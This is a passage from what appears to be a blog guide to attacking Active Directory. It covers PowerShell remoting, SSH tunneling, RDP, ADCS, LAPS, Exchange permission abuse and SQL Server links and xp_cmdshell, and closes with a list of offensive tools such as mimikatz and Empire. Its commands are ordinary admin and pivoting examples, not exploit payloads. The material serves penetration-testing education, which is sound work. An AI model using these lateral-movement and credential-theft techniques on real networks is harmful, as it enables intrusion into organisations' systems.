kind of tasks with <a href="https://docs.microsoft.com/en-us/powershell/">Powershell</a>. By default, Powershell remoting is enabled by
default in Windows server versions (not client like Windows 10)
<a href="https://www.dtonias.com/enable-powershell-remoting-check-enabled/">since Windows Server 2012 R2</a>.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; $pw = ConvertTo-SecureString -AsPlainText -Force -String <span style="color:#e6db74">"Admin1234!"</span>
</span></span><span style="display:flex;"><span>PS C:\&gt; $cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist <span style="color:#e6db74">"contoso\Administrator"</span>,$pw
</span></span><span style="display:flex;"><span>PS C:\&gt; 
</span></span><span style="display:flex;"><span>PS C:\&gt; $session = New-PSSession -ComputerName dc01 -Credential $cred
</span></span><span style="display:flex;"><span>PS C:\&gt; Invoke-Command -Session $session -ScriptBlock {hostname}
</span></span><span style="display:flex;"><span>dc01
</span></span><span style="display:flex;"><span>PS C:\&gt; Enter-PSSession -Session $session
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">dc01</span>]<span style="color:#960050;background-color:#1e0010">:</span> PS C:\Users\Administrator\Documents&gt;</span></span></code></pre></div>
</div>
<figcaption>
Remote PowerShell session with cleartext credentials
</figcaption>
</figure>
<p>
Originally, Powershell remoting was built on top of <a href="#winrm">WinRM</a> protocol. However, it
was expected to be used in Linux machines so it also supports <a href="#ssh">SSH</a> as transport
protocol.</p>
<blockquote>
<p>Is also possible to use Powershell through a web browser if
<a href="https://practical365.com/powershell-web-access-just-how-practical-is-it">Powershell Web Access</a> (PSWA) is enabled.</p>
</blockquote>
<figure>
<pre class="example">                                                         .----------
                                                         |
                         .-----.                       .---
             .----------&gt;| SSH |&gt;---------TCP---------&gt;| 22
             |           '-----'                       '---
             |              |                            |
  .------.   |              |                            |
  | PSRP |&gt;--|              |                          .---
  '------'   |              |                 .--TCP--&gt;| 5985 or 80
             |              |                 |        '---
             |  .-------.   |   .---------.   |          |
             '-&gt;| WinRM |&gt;--|--&gt;| HTTP(S) |&gt;--|          |  
                '-------'   |   '---------'   |          |
                            |        |        |        .---
                            |        |        '--SSL--&gt;| 5986 or 443
                            |        |                 '---
                            |        |                   |
                            |        |                   |
                            |        |                   '----------
                            |   .----------.
                            |   |          |
                         .----------.   .------.
                         | Kerberos |   | NTLM |
                         '----------'   '------'
</pre>
<figcaption>
Powershell remoting protocol stack
</figcaption>
</figure>
<p>
In order to use Powershell remoting, you can use several <a href="https://www.netspi.com/blog/technical/network-penetration-testing/powershell-remoting-cheatsheet/">PSSession CmdLets to use to
execute commands on remote machines</a>. Also, from Linux you can
<a href="https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux?view=powershell-7.1">install Powershell</a> or using a tool like <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>.</p>
<p>
Apart from being useful for <a href="https://www.ired.team/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement">lateral movement</a>, you could also use
<a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1">JEA endpoints</a> (only available over WinRM) as a <a href="https://www.labofapenetrationtester.com/2019/08/race.html">persistence mechanism</a>.</p>
<p>
However, be careful in a pentest since <a href="https://es.slideshare.net/nikhil_mittal/hacked-pray-that-the-attacker-used-powershell">Powershell has many logging features</a>.</p>
<div id="outline-container-trusted-hosts" class="outline-4">
<h4 id="trusted-hosts">
Trusted Hosts
</h4>
<div id="outline-text-trusted-hosts" class="outline-text-4">
<p>
Apart from being enabled to use it, Powershell required also that the
TrustedHost variable is correctly set <strong>in the client</strong>.</p>
<p>
By default, Powershell remoting allows you to connect to all machines in the
domain, by using Kerberos. However, in case you want to connect a machine of a
different domain, you need to add that IP to the TrustedHost value (or use '*'
for any machine). In that case, you have to <strong>configure TrustedHost in the
client</strong>, not in the server (as you may think since from a security perspective
would be the logical idea).</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Set-Item wsman<span style="color:#960050;background-color:#1e0010">:</span>localhost\client\TrustedHosts -Value * -Force</span></span></code></pre></div>
</div>
<figcaption>
Configure TrustedHost in client to allow connections to any machine
</figcaption>
</figure>
<p>
As you may know, you can also use Powershell from a Linux computer, however,
I was unable to set the TrustedHosts in Linux (or similar action to use
Negotiate) in order to connect from a Linux computer to a Windows computer in a
different domain, if you know how to do it, please <a href="mailto:zer1t0ps@protonmail.com">let me know</a>.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-ssh" class="outline-3">
<h3 id="ssh">
SSH
</h3>
<div id="outline-text-ssh" class="outline-text-3">
<p>
SSH (Secure Shell) is a widely used protocol for accessing and managing Unix
systems like Linux, but since 2018 is also <a href="https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview">available for Windows</a>. Even if it is
not related with Active Directory directly, usually many Linux machines deployed
in a domain could be accessed through SSH, so you should know how it works and
what you can do with it.</p>
<p>
The SSH services listens in the <strong>port 22</strong> by default.</p>
<figure>
<pre class="example">                       .----
                       |
   .-----.           .---
   | SSH |&gt;---TCP---&gt;| 22
   '-----'           '---
      |                |
      |                '----
      |
      |
 .----------.
 | Kerberos |
 '----------'
</pre>
<figcaption>
SSH port
</figcaption>
</figure>
<p>
SSH is a very versatile protocol that allows the user get a shell on a remote
system, transfer files (with the <a href="https://linux.die.net/man/1/scp">scp</a> utility) and establishing SSH tunnels.</p>
<p>
It heavily used by Linux machines and maybe you can use to move between domain
computers if you are able to find some <a href="#ssh-keys">ssh keys</a> or valid user credentials.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ ssh foo@db.contoso.local
</span></span><span style="display:flex;"><span>foo@db.contoso.local's password: 
</span></span><span style="display:flex;"><span>Linux db 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Mon Apr 26 11:23:20 2021 from 192.168.122.1
</span></span><span style="display:flex;"><span>foo@db:~$ hostname
</span></span><span style="display:flex;"><span>id</span></span></code></pre></div>
</div>
<figcaption>
SSH session in db.contoso.local as foo user
</figcaption>
</figure>
<p>
Moreover it can also be with <a href="#kerberos">Kerberos</a> in case the target machine is added to the
domain. You can use the Kerberos authentication by enabling the <a href="#gss-api">GSSAPI</a>
authentication (with <code>-o GSSAPIAuthentication=yes</code>).</p>
<div id="outline-container-ssh-tunneling" class="outline-4">
<h4 id="ssh-tunneling">
SSH tunneling
</h4>
<div id="outline-text-ssh-tunneling" class="outline-text-4">
<p>
SSH tunneling allows you to forward the connections from the local machine ports
to the remote machine and vice versa, so it can be pretty useful in order to
pivot in the network bypassing firewalls and network segmentation.</p>
<p>
SSH supports <a href="https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/">three types of port forwarding</a>:</p>
<dl>
<dt>
Local Port Forwarding
</dt>
<dd>
<p>In this case you can map a local port to a port
accessible for the remote machine. For example, if the remote machine
<code class="verbatim">remote.contoso.local</code>  can access to a web site in <code class="verbatim">web.contoso.local:80</code>
that is not reachable by your machine, you could map a local port, for example
8080 to the port 80 of <code class="verbatim">web.contoso.local</code> with an SSH connection executing
<code class="verbatim">ssh -L 8080:web.contoso.local:80 user@remote.contoso.local</code>. Then you can
access to the remote web page by accessing to your local port 8080.</p>
<figure>
<pre class="example">              local                              remote                web
           .----------.                        .--------.            .-----
           |          |      SSH Tunnel        |        |            |
  o      .---        ---. ================== .---      ---.        .---
 /|\ ---&gt;| 8080 -&gt; rand | &gt;&gt;----TCP--&gt;&gt;---&gt;&gt; | 22 -&gt; rand |&gt;-TCP--&gt;| 80
 / \     '---        ---' ================== '---      ---'        '---
           |          |                        |        |            |
           '----------'                        '--------'            '-----
</pre>
<figcaption>
SSH Local Port Forwarding
</figcaption>
</figure>
</dd>
<dt>
Remote Port Forwarding
</dt>
<dd>
<p>Remote port forwarding is the opposite to local port
forwarding. In this case you can make that the remote machine can access to a
port accessible by your machine. If, for example, you can access to a web
page in <code class="verbatim">web.contoso.local:80</code> but the remote machine can't, you can map a
port like 8080 of the remote machine to the port 80 of <code class="verbatim">web.contoso.local</code>
with the following command
<code class="verbatim">ssh -R 8080:web.contoso.local:80 user@remote.contoso.local</code>. This way, people
that connect to the port 8080 of the remote machine will be able to reach the
web server.</p>
<figure>
<pre class="example"> web                 local                           remote 
 ----.            .----------.                     .--------.
     |            |          |     SSH Tunnel      |        |    
    ---.        .---        ---. ==============  .---      ---.        o
    80 |&lt;--TCP-&lt;| rand &lt;- rand | &lt;&lt;--&lt;&lt;-TCP--&lt;&lt;  | 22 &lt;- 8080 | &lt;---- /|\
    ---'        '---        ---' ==============  '---      ---'       / \
     |            |          |                     |        |
 ----'            '----------'                     '--------'
</pre>
<figcaption>
SSH Remote Port Forwarding
</figcaption>
</figure>
</dd>
<dt>
Dynamic Port Forwarding
</dt>
<dd>
<p>Finally, the Dynamic Port Forwarding allows you to
communicate with any port reachable for the remote machine, by creating a
<a href="https://en.wikipedia.org/wiki/SOCKS">SOCKS</a> proxy. You indicate a local port where the SOCKS proxy will listen, and
it will forward all your requests to the remote machine via SSH and then to
the target machine:port. For example, you can setup a SOCKS proxy in port 8080
with the following command <code class="verbatim">ssh -D 8080 user@remote.contoso.local</code>. </p>
<figure>
<pre class="example">                                                                         web
                                                                       .-----
                                                                       |
                  local                            remote            .---
               .----------.                      .--------.    .----&gt;| 80
               |          |      SSH Tunnel      |        |    |     '---
             .---        ---. ================ .---      ---.  |       |
     web:80  |              | &gt;---web:80----&gt;&gt; |  ---&gt; rand |&gt;-'       '-----
  o  -------&gt;|              |                  |         ---'
 /|\         | 8080 -&gt; rand |                  | 22       |
 / \ db:3306 |              |                  |         ---.            db
     -------&gt;|              | &gt;---db:3306---&gt;&gt; |  ---&gt; rand |&gt;-.       .-----
             '---        ---' ================ '---      ---'  |       |
               |          |                      |        |    |     .---
               '----------'                      '--------'    '----&gt;| 3306
                                                                     '---
                                                                       |
                                                                       '-----
</pre>
<figcaption>
SSH Dynamic Port Forwarding
</figcaption>
</figure>
</dd>
</dl>
<p>
Sometimes <a href="https://man.openbsd.org/sshd_config#AllowTcpForwarding">TCP Forwarding is disabled</a> in SSH servers, preventing use from
creating SSH tunnels. In those cases you can use <a href="https://github.com/TarlogicSecurity/SaSSHimi">SaSSHimi</a> to create tunnels.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-rdp" class="outline-3">
<h3 id="rdp">
RDP
</h3>
<div id="outline-text-rdp" class="outline-text-3">
<p>
 RDP (Remote Desktop Protocol) is protocol that allows you connect to other
 machines providing a graphical user interface. Is commonly used in Windows
 environments to connect and manage remote machines since both client and server
 are included in Windows by default.</p>
<figure>
<img src="./rdp_client.png" alt="./rdp_client.png" title="./rdp_client.png"><figcaption>
RDP Windows client
</figcaption>
</figure>
<p>
 You can check if a machine is using RDP commonly by checking if ports 3389/TCP
 or 3389/UDP are open. </p>
<figure>
<pre class="example">                       .----
                       |
   .-----.           .---
   | RDP |----------&gt;| 3389 TCP and UDP
   '-----'           '---
                       |
                       '----
</pre>
<figcaption>
RDP port
</figcaption>
</figure>
<p>
 However, in order to access to that machine, the user must be member of
 <code class="verbatim">Administrators</code> or <code class="verbatim">Remote Desktop Users</code> local groups. Also, be careful since
 only a graphical session is allowed in Windows, so connecting through RDP could
 log off other user. </p>
<p>
 Apart from managing remotely the machine, you can <a href="https://www.errno.fr/RDPTunneling.html">use RDP to create a SOCKS proxy</a>
 that allows to use the remote machine to pivot across the network by using
 <a href="https://github.com/nccgroup/SocksOverRDP">SocksOverRDP</a> or <a href="https://www.freerdp.com/">freerdp</a> with <a href="https://github.com/V-E-O/rdp2tcp">rdp2tcp</a>. </p>
<p>
 You should also keep in mind that when a machine is connected through RDP, the
 user <strong>credentials are sent over the network</strong> to the target machine (since the
 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/credential-security-support-provider">CredSSP</a> provider), so users connected by RDP are susceptible of credential
 steeling by dumping the lsass process memory.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-microsoft-extras" class="outline-2">
<h2 id="microsoft-extras">
Microsoft extras
</h2>
<div id="outline-text-microsoft-extras" class="outline-text-2">
<p>
Active Directory is a central piece in the network ecosystem and many other
Microsoft products used/enhanced it for multiple purposes. This section includes
some Microsoft software that the attacker should be aware in case of being
installed in the domain.</p>
<div id="outline-container-adcs" class="outline-3">
<h3 id="adcs">
ADCS
</h3>
<div id="outline-text-adcs" class="outline-text-3">
<p>
The Active Directory Certificate Services (ADCS) are…</p>
<p>
I didn't have time to redact this properly, but is a great source of pwn.
Please, read the following resources. They completely deserves your time:</p>
<ul>
<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">Certified Pre-Owned (Post)</a></li>
<li><a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned (Whitpaper)</a></li>
<li><a href="https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/">AD CS relay attack - practical guide</a></li>
<li><a href="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/">NTLM relaying to AD CS - On certificates, printers and a little hippo</a></li>
</ul>
<p>Here are the related tools:</p>
<ul>
<li><a href="https://github.com/GhostPack/Certify">Certify</a>: Ask for certificates and review weaknesses in ADCS configuration.</li>
<li><a href="https://github.com/GhostPack/ForgeCert">ForgeCert</a>: Build custom/golden certificate to impersonate users.</li>
<li><a href="https://github.com/gentilkiwi/kekeo">Kekeo</a>: In this case used to get a TGT or retrieve the NT hash using a certificate.</li>
<li><a href="https://github.com/GhostPack/Rubeus/">Rubeus</a>: In this case used to get a TGT or retrieve the NT hash using a certificate.</li>
<li><a href="https://github.com/ExAndroidDev/impacket/tree/ntlmrelayx-adcs-attack">ntlmrelayx.py (ExAndroidDev impacket fork)</a>: Perform NTLM relay attacks
against ADCS web endpoint.</li>
<li><a href="https://github.com/topotam/PetitPotam">PetitPotam</a>: To trigger the NTLM relay attack.</li>
<li><a href="https://github.com/dirkjanm/PKINITtools">PKINITTools</a>:  In this case used to retrieve the NT hash using a certificate,
among others. Python tools.</li>
<li><a href="https://github.com/zer1t0/certi">certi.py</a>: Impacket version of Certify. Ask for certificate and review ADCS
configuration. </li>
</ul>
</div>
</div>
<div id="outline-container-laps" class="outline-3">
<h3 id="laps">
LAPS
</h3>
<div id="outline-text-laps" class="outline-text-3">
<p>
<a href="https://adsecurity.org/?p=3164">LAPS</a> (Local Administrator Password Solution) is an utility to manage the
passwords of the domain computers local administrators. LAPS randomize the local
administrator passwords in order to avoid reusing credentials and changes them
periodically.</p>
<p>
For this purpose LAPS add two properties to the computer objects of the domain:
<code class="verbatim">ms-Mcs-AdmPwd</code> and <code class="verbatim">ms-Mcs-AdmPwdExpirationTime</code>.</p>
<p>
The <code class="verbatim">ms-Mcs-AdmPwd</code> stores the machine local <code class="verbatim">Administrator</code> password, and only
can be seen if explicit granted to it is given. If you are able to get the local
administrator password, you can connect to the computer (using NTLM
authentication) with… well, admin rights.</p>
<p>
The other property <code class="verbatim">ms-Mcs-AdmPwdExpirationTime</code> can be read by anyone (by
default), so in order to identify computers managed by LAPS, you can search for
computer objects that contain that property.</p>
</div>
</div>
<div id="outline-container-exchange" class="outline-3">
<h3 id="exchange">
Exchange
</h3>
<div id="outline-text-exchange" class="outline-text-3">
<p>
Exchange is a mail server developed by Microsoft that can be installed in the
Windows Servers and integrated with Active Directory.</p>
<p>
When Exchange is installed <a href="https://adsecurity.org/?p=4119 ">several groups and ACEs</a> are created in the domain.</p>
<p>
Maybe the most relevant thing before the <a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/released-february-2019-quarterly-exchange-updates/ba-p/609061">February 2019 update</a> thing is that the
<strong>Exchange Windows Permissions</strong> group had <code class="verbatim">WriteDacl</code> permission over the domain
object by default. That means that in outdated installations (that for sure
exist on the wild) members of such group can write ACEs that will give the
<code class="verbatim">DS-Replication-Get-Changes</code> and <code class="verbatim">DS-Replication-Get-Changes-All</code> permissions to
any user in the domain, allowing that account to perform a dcsync attack and
then retrieve the domain users credentials.</p>
<p>
Additionally, the <code class="verbatim">Exchange Trusted Subsystem</code> group, to which all the Exchange
servers belong, is member of <code class="verbatim">Exchange Windows Permissions</code> group. Therefore,
compromising any Exchange server could allow an attacker to have permissions to
compromise the entire domain.</p>
<p>
Maybe the most famous abuse of Exchange permissions was the <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">PrivExchange attack</a>
that abuses a <a href="https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange">vulnerability on Exchange servers</a> that allows an user to force an
HTTP authenticated connection from the Exchange Server to another computer. Then
by performing a NTLM Relay attack from HTTP to LDAP, the Exchange Server was
coerced to give DCsync rights to an arbitrary user account. Microsoft also
released the patch for this vulnerability in the <a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/released-february-2019-quarterly-exchange-updates/ba-p/609061">February 2019 update</a>. </p>
<p>
Moreover, the <a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/"><code class="verbatim">Organization Admins</code> group</a> (also added by Exchange) can control
the membership of <code class="verbatim">Exchange Windows Permissions</code> and <code class="verbatim">Exchange Trusted
Subsystem</code>. Apart from that, the <code class="verbatim">Organization Admins</code> are local administrator
in the Exchange servers, so being member of this group, will also allow an user
to compromise the entire domain.</p>
<figure>
<pre class="example">                                                               .--------.
                                                               | Object |
                                                .--WriteDacl--&gt;| domain |
                                                |              '--------'
                                                |
                                                |
                                                |
                                 .-----------------------------.
                                 |            Group            |
                         .------&gt;| Exchange Windows Permission |
                         |       '-----------------------------'
                         |                      ^
                         |                      |
            .-controls---|                    member
            |            |                      |
            |            |                      ^
            |            |       .----------------------------.
            |            |       |           Group            |
            |            '------&gt;| Exchange Trusted Subsystem |
            ^                    '----------------------------'
 .---------------------.               ^                ^
 |        Group        |               |                |
 | Organization Admins |               |                |
 '---------------------'             member           member
            v                          |                |
            |                .---------|----------------|----------.
            |                |         |    Exchange    |          |
            |                |         |    Servers     |          |
            |                |         |                |          |
            |                |        .---.            .---.       |
            |                |       /   /|           /   /|       |
            |                |      .---. |          .---. |       |
            |                |      |   | '          |   | '       |
            |                |      |   |/           |   |/        |
            |                |      '---'            '---'         |
            |                |      exch1            exch2         |
            |                |        ^                ^           |
            |                '--------|----------------|-----------'
            |                         |                |
            |                         '----------------'
            |                                  |
            '-----&gt;&gt;------admin of------&gt;&gt;-----'
</pre>
<figcaption>
Exchange groups and permissions
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-sql-server" class="outline-3">
<h3 id="sql-server">
SQL Server
</h3>
<div id="outline-text-sql-server" class="outline-text-3">
<p>
Microsoft SQL Server (MSSQL) is a database management system created by
Microsoft. It is usually installed on Windows Server machines, listening in the
TCP port 1433 and many web applications uses it as database.</p>
<p>
The SQL Server listen in the TCP port 1433 and it is possible to connect to it
by using domain credentials, since it uses the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec">TDS</a> protocol, which is compatible
with NTLM and Kerberos authentication.</p>
<p>
To communicate to an SQL server it is possible to use the  <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec">TDS</a> protocol directly
over <a href="https://docs.microsoft.com/en-us/sql/sql-server/install/configure-the-windows-firewall-to-allow-sql-server-access?view=sql-server-ver15#BKMK_ssde">TCP or using SMB</a>. In case of using TCP, the default port is 1433, but is
also possible to use a dynamic port.</p>
<figure>
<pre class="example">  .------.     .----------.
  | NTLM |     | Kerberos |
  '------'     '----------'
     |              |
     '------.-------'
            |
            |
     .------'------.        .------------
     |             |        |
     |          .-----.   .---
     |      .--&gt;| SMB |--&gt;| 445/TCP
     |      |   '-----'   '---
     |      |               |
     |      |               |
  .-----.   |             .---         SQL
  | TDS |---'-----TCP----&gt;| 1433/TCP  
  '-----'                 '---        Server
                            |
                            |
  .------.                .---
  | SQLR |--------UDP----&gt;| 1434/UDP
  '------'                '---
                            |
                            '------------
</pre>
<figcaption>
SQL server port and protocols
</figcaption>
</figure>
<p>
When a <a href="https://docs.microsoft.com/en-us/sql/sql-server/install/configure-the-windows-firewall-to-allow-sql-server-access?view=sql-server-ver15#BKMK_dynamic_ports">dynamic port</a> is used, a random TCP port is selected. To allow a remote
client to discover this port, the SQL Server Browser must be enabled in the UDP
port 1434, waiting for <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-sqlr/1ea6e25f-bff9-4364-ba21-5dc449a601b7">SQLR</a> (SQL Server Resolution) queries. You can use the
impacket <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlinstance.py">mssqlinstance.py</a> tool to discover the SQL server dynamic port.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ mssqlinstance.py 192.168.100.19
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Instance 0
</span></span><span style="display:flex;"><span>ServerName:SRV01
</span></span><span style="display:flex;"><span>InstanceName:SQLEXPRESS
</span></span><span style="display:flex;"><span>IsClustered:No
</span></span><span style="display:flex;"><span>Version:15.0.2000.5
</span></span><span style="display:flex;"><span>[*] Instance 1
</span></span><span style="display:flex;"><span>ServerName:SRV01
</span></span><span style="display:flex;"><span>InstanceName:MSSQLSERVER
</span></span><span style="display:flex;"><span>IsClustered:No
</span></span><span style="display:flex;"><span>Version:15.0.2000.5
</span></span><span style="display:flex;"><span>tcp:50377</span></span></code></pre></div>
</div>
<figcaption>
Query to SQL Server Browser
</figcaption>
</figure>
<p>
Here, you can see that the SQL Server port is 50377, now you can use a SQL
Server client like <a href="https://www.heidisql.com/">HeidiSQL</a>, <a href="https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15">SQL Server Management Studio</a>, or <a href="https://github.com/NetSPI/PowerUpSQL/">PowerUpSQL</a> to
connect to the database.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; . .\PowerUpSQL.ps1
</span></span><span style="display:flex;"><span>PS C:\&gt; Get-SQLQuery -Query <span style="color:#e6db74">"Select @@version"</span> -Instance <span style="color:#e6db74">"srv01,50377"</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Column1
</span></span><span style="display:flex;"><span>-------
</span></span><span style="display:flex;"><span>Microsoft SQL Server <span style="color:#ae81ff">2019</span> (RTM) - <span style="color:#ae81ff">15.0</span>.2000.5 (X64) ...</span></span></code></pre></div>
</div>
<figcaption>
SQL query with a dynamic port
</figcaption>
</figure>
<p>
An important aspect of SQL server is the ability to execute commands through
the <code class="verbatim">xp_cmdshell</code> command, if it is allowed.</p>
<blockquote>
<p>Sometimes in misconfigured environments, even if the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a> command is
disabled, the user has enough privileges to
<a href="https://www.tarlogic.com/en/blog/red-team-tales-0x01/">enable it with the <code class="verbatim">sp_configure</code> directive</a>.</p>
</blockquote>
<p>
Moreover, the <code class="verbatim">xp_dirtree</code> command can be useful to access to files of the
network (using UNC paths) or for making authenticated requests to other
machines, by using the domain computer account in order to <a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478">recollect NTLM hashes</a>
to crack or perform <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-1-mssql-rcelpe">NTLM relay</a>. </p>
<blockquote>
<p>SQL injection is out of the scope of this post, but if you want more
information about how to exploit SQL Injection in SQL Server or other databases,
you can check the <a href="https://sqlwiki.netspi.com">NetSPI</a>, <a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection">Pentest Monkey</a> or <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger</a> cheat sheets.</p>
</blockquote>
<p>
Additionally, an incredible useful characteristic for an attacker could be the
<strong>SQL Server links</strong>. SQL Server allows to create links with other data sources,
like other SQL databases.</p>
<p>
The interesting thing about those links is that even if they are created by a
privileged user like an administrator, they can be used by any user and will
allow to <a href="https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/">execute commands in remote machines</a> with the privileges of the link
creator.</p>
<figure>
<pre class="example">                         .---.                             .---.
                        /   /|         SQL link           /   /|
   o                   .---. | ========================= .---. |
  /|\  ---unpriv----&gt;  |   | '  ---------dbadmin------&gt;  |   | '
  / \                  |   |/  ========================= |   |/ 
                       '---'                             '---'  
                        db1                               db2
</pre>
<figcaption>
Using a link created by dbadmin
</figcaption>
</figure>
<p>
Additionally, if you like pivoting through SQL Server you can also convert it in
a SOCKS proxy by using <a href="https://github.com/blackarrowsec/mssqlproxy">mssqlproxy</a>.</p>
<p>
For more ways to abuse SQL Servers, you can use the <a href="https://github.com/NetSPI/PowerUpSQL/">PowerUpSQL</a> toolkit and
definitely, you should check its <a href="https://github.com/NetSPI/PowerUpSQL/wiki">wiki</a>.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-recommended-resources" class="outline-2">
<h2 id="recommended-resources">
Recommended resources
</h2>
<div id="outline-text-recommended-resources" class="outline-text-2">
<p>
In this article there are many resources linked, and you are encouraged to
follow them to learn more. However, there are some special sites that I
consider very good and with lots of on Active Directory information:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/MS-WINPROTLP/e36c976a-6263-42a8-b119-7a3cc41ddd2a">Microsoft Windows Technical Documents</a></li>
<li><a href="https://adsecurity.org/">Active Directory Security</a></li>
<li><a href="https://blog.harmj0y.net/">https://blog.harmj0y.net/</a></li>
<li><a href="https://en.hackndo.com/">hackndo</a></li>
<li><a href="https://dirkjanm.io/">https://dirkjanm.io/</a></li>
<li><a href="https://syfuhs.net/">Steve on Security</a></li>
<li><a href="https://www.labofapenetrationtester.com/">Lab of a Penetration Tester</a></li>
<li><a href="https://www.ired.team/">ired.team</a></li>
</ul>
<p>There many other incredible sites with Active Directory posts, but I these are
special relevant since described many topics and are specially dedicated to
Active Directory.</p>
<p>
Apart from blogs, here I let you a selection of great Active Directory oriented
tools, that apart from being useful, could allow you to learn a lot of Active
Directory mechanism and protocols by reviewing its code. (This is far from being
an exhaustive list and many more are listed and shown in the article).</p>
<ul>
<li><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>: Probably the most famous tool for attacking Windows and Active
Directory. It implements in C <a href="https://github.com/gentilkiwi/mimikatz/wiki">all kind of attacks</a> to retrieve credentials from
Windows machines and impersonate users in Active Directory.</li>
<li><a href="https://github.com/SecureAuthCorp/impacket">impacket</a>: Impacket implements many of the protocols described here in python
and it is worth to know how it works to learn about them. It also include many
examples that implement attacks described here.</li>
<li><a href="https://github.com/lgandx/Responder">responder.py</a>: Responder allows you to perform a lot of PitM attacks abusing
Windows resolution protocols and giving you a lot of protocol servers that
will collect NTLM hashes. Worth to know how it works.</li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a>: Rubeus is a C# suite to perform Kerberos attacks from Windows
machines. You can check it to learn a lot about how Kerberos work. </li>
<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>: CME is a python tool that allows you to perform a lot of
different attacks described here in an easy way.</li>
<li><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>: BloodHound allows you to map the Active Directory network with
many different LDAP requests and others. You should check it if you want to
learn about Active Directory reconnaissance.</li>
<li><a href="https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1">Powerview</a>: A Powershell tool that implements a lot of Active Directory LDAP
and other protocol queries to retrieve <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">all kind of information</a> from Active
Directory. </li>
<li><a href="https://github.com/BC-SECURITY/Empire">Empire</a>: A suite to deploy agents in Active Directory machines that allows you
to perform all kind of attacks. The <a href="https://github.com/BC-SECURITY/Empire/tree/master/data/module_source">data/module_source</a> directory contains a
lot of tools to perform reconnaissance and attacks over Active Directory that
are worth to check.</li>
</ul>
</div>
</div>

    </main>
</div>

<footer>
    Based on <a href="https://themes.gohugo.io/hugo-classic/">Hugo Classic</a>
</footer>

    


</body></html>